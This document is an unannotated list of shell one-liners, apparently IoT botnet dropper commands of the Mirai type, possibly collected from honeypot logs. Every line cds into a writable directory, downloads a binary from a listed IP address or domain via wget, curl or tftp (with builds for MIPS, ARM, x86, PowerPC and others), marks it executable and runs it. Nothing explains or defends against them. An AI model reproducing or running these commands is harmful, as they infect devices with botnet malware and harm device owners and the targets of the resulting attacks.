cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.50.205/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.173.209.45/fyfa.i586; curl -O http://107.173.209.45/fyfa.i586; chmod +x fyfa.i586; ./fyfa.i586; rm -rf fyfa.i586
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.173.209.45/fyfa.m68k; curl -O http://107.173.209.45/fyfa.m68k; chmod +x fyfa.m68k; ./fyfa.m68k; rm -rf fyfa.m68k
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.173.209.45/fyfa.spc; curl -O http://107.173.209.45/fyfa.spc; chmod +x fyfa.spc; ./fyfa.spc; rm -rf fyfa.spc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.173.209.45/fyfa.pcc; curl -O http://107.173.209.45/fyfa.pcc; chmod +x fyfa.pcc; ./fyfa.pcc; rm -rf fyfa.pcc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.173.209.45/fyfa.armv6; curl -O http://107.173.209.45/fyfa.armv6; chmod +x fyfa.armv6; ./fyfa.armv6; rm -rf fyfa.armv6
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://174.138.56.147/cock; chmod +x cock; ./cock; rm -rf cock
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://174.138.56.147/net; chmod +x net; ./net; rm -rf net
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://174.138.56.147/botnet; chmod +x botnet; ./botnet; rm -rf botnet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://174.138.56.147/swatnet; chmod +x swatnet; ./swatnet; rm -rf swatnet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://174.138.56.147/dicknet; chmod +x dicknet; ./dicknet; rm -rf dicknet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://174.138.56.147/fucknet; chmod +x fucknet; ./fucknet; rm -rf fucknet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://174.138.56.147/cracknet; chmod +x cracknet; ./cracknet; rm -rf cracknet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://174.138.56.147/weednet; chmod +x weednet; ./weednet; rm -rf weednet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://174.138.56.147/gaynet; chmod +x gaynet; ./gaynet; rm -rf gaynet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://174.138.56.147/queernet; chmod +x queernet; ./queernet; rm -rf queernet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://174.138.56.147/ballnet; chmod +x ballnet; ./ballnet; rm -rf ballnet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://174.138.56.147/unet; chmod +x unet; ./unet; rm -rf unet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://174.138.56.147/yougay; chmod +x yougay; ./yougay; rm -rf yougay
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://rozew.tk/bins/masuta.mips -O sunlessmiraimips; chmod +x sunlessmiraimips; ./sunlessmiraimips ssh; rm -rf sunlessmiraimips
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://rozew.tk/bins/masuta.mpsl -O sunlessmiraimipsel; chmod +x sunlessmiraimipsel; ./sunlessmiraimipsel ssh; rm -rf sunlessmiraimipsel
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://rozew.tk/bins/masuta.sh4 -O sunlessmiraish4; chmod +x sunlessmiraish4; ./sunlessmiraish4 ssh; rm -rf sunlessmiraish4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://rozew.tk/bins/masuta.x86 -O sunlessmiraix86; chmod +x sunlessmiraix86; ./sunlessmiraix86 x86_64; rm -rf sunlessmiraix86
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://rozew.tk/bins/masuta.ppc -O sunlessmiraippc; chmod +x sunlessmiraippc; ./sunlessmiraippc POWERPC; rm -rf sunlessmiraippc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://rozew.tk/bins/masuta.arm7 -O sunlessmiraiarm7; chmod +x sunlessmiraiarm7; ./sunlessmiraiarm7 ssh; rm -rf sunlessmiraiarm7
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://rozew.tk/bins/masuta.arm -O sunlessmiraiarm; chmod +x sunlessmiraiarm; ./sunlessmiraiarm ssh; rm -rf sunlessmiraiarm
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://rozew.tk/bins/masuta.sh4 -O sunlessmiraish4; chmod +x sunlessmiraish4; ./sunlessmiraish4 ssh; rm -rf sunlessmiraish4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.244.73.53/3MaF4G/shinto.x86; curl -O http://104.244.73.53/3MaF4G/shinto.x86;cat shinto.x86 >AbAC ssh;chmod +x *;./AbAC ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.244.73.53/3MaF4G/shinto.mips; curl -O http://104.244.73.53/3MaF4G/shinto.mips;cat shinto.mips >AbAC ssh;chmod +x *;./AbAC ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.244.73.53/3MaF4G/shinto.mpsl; curl -O http://104.244.73.53/3MaF4G/shinto.mpsl;cat shinto.mpsl >AbAC ssh;chmod +x *;./AbAC ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.244.73.53/3MaF4G/shinto.arm4; curl -O http://104.244.73.53/3MaF4G/shinto.arm4;cat shinto.arm4 >AbAC ssh;chmod +x *;./AbAC ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.244.73.53/3MaF4G/shinto.arm5; curl -O http://104.244.73.53/3MaF4G/shinto.arm5;cat shinto.arm5 >AbAC ssh;chmod +x *;./AbAC ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.244.73.53/3MaF4G/shinto.arm6; curl -O http://104.244.73.53/3MaF4G/shinto.arm6;cat shinto.arm6 >AbAC ssh;chmod +x *;./AbAC ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.244.73.53/3MaF4G/shinto.arm7; curl -O http://104.244.73.53/3MaF4G/shinto.arm7;cat shinto.arm7 >AbAC ssh;chmod +x *;./AbAC ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.244.73.53/3MaF4G/shinto.ppc; curl -O http://104.244.73.53/3MaF4G/shinto.ppc;cat shinto.ppc >AbAC ssh;chmod +x *;./AbAC ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.244.73.53/3MaF4G/shinto.m68k; curl -O http://104.244.73.53/3MaF4G/shinto.m68k;cat shinto.m68k >AbAC ssh;chmod +x *;./AbAC ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.244.73.53/3MaF4G/shinto.sh4; curl -O http://104.244.73.53/3MaF4G/shinto.sh4;cat shinto.sh4 >AbAC ssh;chmod +x *;./AbAC ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.25/mba; chmod +x mba; ./mba; rm -rf mba
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.25/ebs; chmod +x ebs; ./ebs; rm -rf ebs
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.25/ew; chmod +x ew; ./ew; rm -rf ew
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.25/aw; chmod +x aw; ./aw; rm -rf aw
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.25/ftr; chmod +x ftr; ./ftr; rm -rf ftr
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.25/er; chmod +x er; ./er; rm -rf er
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.25/re; chmod +x re; ./re; rm -rf re
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.25/ty; chmod +x ty; ./ty; rm -rf ty
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.25/ke; chmod +x ke; ./ke; rm -rf ke
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.25/as; chmod +x as; ./as; rm -rf as
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.25/fg; chmod +x fg; ./fg; rm -rf fg
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.25/sddf; chmod +x sddf; ./sddf; rm -rf sddf
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.25/tel; chmod +x tel; ./tel; rm -rf tel
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.13.109/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.13.109/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.13.109/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.13.109/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.13.109/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.13.109/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.13.109/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.13.109/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.13.109/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.13.109/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.13.109/'[CPU]'; chmod +x '[CPU]'; ./'[CPU]'; rm -rf '[CPU]'
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.13.109/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.13.109/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.144/earyzq; chmod +x earyzq; ./earyzq; rm -rf earyzq
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.144/cemtop; chmod +x cemtop; ./cemtop; rm -rf cemtop
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.144/vtyhat; chmod +x vtyhat; ./vtyhat; rm -rf vtyhat
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.144/vvglma; chmod +x vvglma; ./vvglma; rm -rf vvglma
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.144/nvitpj; chmod +x nvitpj; ./nvitpj; rm -rf nvitpj
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.144/razdzn; chmod +x razdzn; ./razdzn; rm -rf razdzn
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.144/lnkfmx; chmod +x lnkfmx; ./lnkfmx; rm -rf lnkfmx
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.144/qvmxvl; chmod +x qvmxvl; ./qvmxvl; rm -rf qvmxvl
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.144/ajoomk; chmod +x ajoomk; ./ajoomk; rm -rf ajoomk
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.144/fwdfvf; chmod +x fwdfvf; ./fwdfvf; rm -rf fwdfvf
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.144/atxhua; chmod +x atxhua; ./atxhua; rm -rf atxhua
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.144/qtmzbn; chmod +x qtmzbn; ./qtmzbn; rm -rf qtmzbn
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.144/adcvds; chmod +x adcvds; ./adcvds; rm -rf adcvds
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.158.115.99/fyfa.mips; curl -O http://185.158.115.99/fyfa.mips; chmod +x fyfa.mips; ./fyfa.mips; rm -rf fyfa.mips
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.158.115.99/fyfa.mpsl; curl -O http://185.158.115.99/fyfa.mpsl; chmod +x fyfa.mpsl; ./fyfa.mpsl; rm -rf fyfa.mpsl
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.158.115.99/fyfa.sh4; curl -O http://185.158.115.99/fyfa.sh4; chmod +x fyfa.sh4; ./fyfa.sh4; rm -rf fyfa.sh4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.158.115.99/fyfa.x86; curl -O http://185.158.115.99/fyfa.x86; chmod +x fyfa.x86; ./fyfa.x86; rm -rf fyfa.x86
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.158.115.99/fyfa.arm; curl -O http://185.158.115.99/fyfa.arm; chmod +x fyfa.arm; ./fyfa.arm; rm -rf fyfa.arm
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.158.115.99/fyfa.pcc; curl -O http://185.158.115.99/fyfa.pcc; chmod +x fyfa.pcc; ./fyfa.pcc; rm -rf fyfa.pcc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.158.115.99/fyfa.i686; curl -O http://185.158.115.99/fyfa.i686; chmod +x fyfa.i686; ./fyfa.i686; rm -rf fyfa.i686
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.158.115.99/fyfa.i586; curl -O http://185.158.115.99/fyfa.i586; chmod +x fyfa.i586; ./fyfa.i586; rm -rf fyfa.i586
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.158.115.99/fyfa.m68k; curl -O http://185.158.115.99/fyfa.m68k; chmod +x fyfa.m68k; ./fyfa.m68k; rm -rf fyfa.m68k
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.158.115.99/fyfa.spc; curl -O http://185.158.115.99/fyfa.spc; chmod +x fyfa.spc; ./fyfa.spc; rm -rf fyfa.spc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.158.115.99/fyfa.pcc; curl -O http://185.158.115.99/fyfa.pcc; chmod +x fyfa.pcc; ./fyfa.pcc; rm -rf fyfa.pcc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://63.141.247.10/spooks; chmod +x spooks; ./spooks; rm -rf spooks
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://63.141.247.10/spooks2; chmod +x spooks2; ./spooks2; rm -rf spooks2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://63.141.247.10/spooks3; chmod +x spooks3; ./spooks3; rm -rf spooks3
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://63.141.247.10/spooks4; chmod +x spooks4; ./spooks4; rm -rf spooks4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://63.141.247.10/spooks5; chmod +x spooks5; ./spooks5; rm -rf spooks5
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://63.141.247.10/spooks6; chmod +x spooks6; ./spooks6; rm -rf spooks6
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://63.141.247.10/spooks7; chmod +x spooks7; ./spooks7; rm -rf spooks7
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://63.141.247.10/spooks8; chmod +x spooks8; ./spooks8; rm -rf spooks8
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://63.141.247.10/spooks9; chmod +x spooks9; ./spooks9; rm -rf spooks9
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://63.141.247.10/spooks10; chmod +x spooks10; ./spooks10; rm -rf spooks10
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://63.141.247.10/spooks11; chmod +x spooks11; ./spooks11; rm -rf spooks11
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://63.141.247.10/spooks12; chmod +x spooks12; ./spooks12; rm -rf spooks12
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ntpd -g 89.34.99.95;cat ntpd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sshd -g 89.34.99.95;cat sshd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r openssh -g 89.34.99.95;cat openssh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r bash -g 89.34.99.95;cat bash >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r tftp -g 89.34.99.95;cat tftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r wget -g 89.34.99.95;cat wget >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r cron -g 89.34.99.95;cat cron >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ftp -g 89.34.99.95;cat ftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r pftp -g 89.34.99.95;cat pftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r dtpg -g 89.34.99.95;cat dtpg >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r crons -g 89.34.99.95;cat crons >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ttpd -g 89.34.99.95;cat ttpd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r htpdxmp -g 89.34.99.95;cat htpdxmp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sh -g 89.34.99.95;cat sh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r [cpu] -g 89.34.99.95;cat [cpu] >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r apache2 -g 89.34.99.95;cat apache2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r telnetd -g 89.34.99.95;cat telnetd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ntpd -g 138.197.101.240;cat ntpd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sshd -g 138.197.101.240;cat sshd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r openssh -g 138.197.101.240;cat openssh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r bash -g 138.197.101.240;cat bash >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r tftp -g 138.197.101.240;cat tftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r wget -g 138.197.101.240;cat wget >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r cron -g 138.197.101.240;cat cron >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ftp -g 138.197.101.240;cat ftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r pftp -g 138.197.101.240;cat pftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sh -g 138.197.101.240;cat sh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' ' -g 138.197.101.240;cat ' ' >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r apache2 -g 138.197.101.240;cat apache2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r telnetd -g 138.197.101.240;cat telnetd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 213.136.87.96 -c get ntpd;cat ntpd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 213.136.87.96 -c get sshd;cat sshd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 213.136.87.96 -c get openssh;cat openssh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 213.136.87.96 -c get bash;cat bash >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 213.136.87.96 -c get tftp;cat tftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 213.136.87.96 -c get wget;cat wget >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 213.136.87.96 -c get cron;cat cron >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 213.136.87.96 -c get ftp;cat ftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 213.136.87.96 -c get pftp;cat pftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 213.136.87.96 -c get sh;cat sh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 213.136.87.96 -c get ' ';cat ' ' >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 213.136.87.96 -c get apache2;cat apache2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 213.136.87.96 -c get telnetd;cat telnetd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.32.74.131 -c get synbot.retard0;cat synbot.retard0 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.32.74.131 -c get synbot.retard1;cat synbot.retard1 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.32.74.131 -c get synbot.retard2;cat synbot.retard2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.32.74.131 -c get synbot.retard3;cat synbot.retard3 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.32.74.131 -c get synbot.retard4;cat synbot.retard4 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.32.74.131 -c get synbot.retard5;cat synbot.retard5 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.32.74.131 -c get synbot.retard6;cat synbot.retard6 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.32.74.131 -c get synbot.retard7;cat synbot.retard7 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.32.74.131 -c get synbot.retard8;cat synbot.retard8 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.32.74.131 -c get synbot.retard9;cat synbot.retard9 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.32.74.131 -c get synbot.retard10;cat synbot.retard10 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.32.74.131 -c get synbot.retard11;cat synbot.retard11 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.32.74.131 -c get synbot.retard12;cat synbot.retard12 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.51/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.51/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.51/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.51/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.51/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.51/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.51/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.51/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.51/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.51/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.51/' '; chmod +x ' '; ./' '; rm -rf ' '
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.51/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.51/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ntpd -g 46.166.185.173;cat ntpd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sshd -g 46.166.185.173;cat sshd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r openssh -g 46.166.185.173;cat openssh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r bash -g 46.166.185.173;cat bash >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r tftp -g 46.166.185.173;cat tftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r wget -g 46.166.185.173;cat wget >badbox;chmod +x *;./badbox
